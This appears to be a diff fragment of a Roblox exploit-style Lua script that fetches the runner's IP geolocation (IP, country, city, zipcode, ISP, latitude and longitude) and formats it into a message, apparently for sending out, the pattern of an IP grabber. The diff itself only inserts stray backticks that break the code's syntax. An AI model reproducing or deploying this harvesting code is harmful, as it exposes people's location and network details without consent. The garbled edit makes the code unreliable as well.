@@ -13,7 +13,7 @@ local getIPInfo = syn.request({
 })
 local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)
 local FI = {
-    IP = IPBuffer,
+   ` IP = IPBuffer,
     country = IIT.country,
     countryCode = IIT.countryCode,
     region = IIT.region,
@@ -23,7 +23,7 @@ local FI = {
     latitude = IIT.lat,
     longitude = IIT.lon,
     isp = IIT.isp,
-    org = IIT.org
+    org = IIT.org `
 }
 local dataMessage = string.format("User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s", name, FI.IP, FI.country, FI.countryCode, FI.region, FI.regionName, FI.city, FI.zipcode, FI.isp, FI.org)
 local MessageData = {
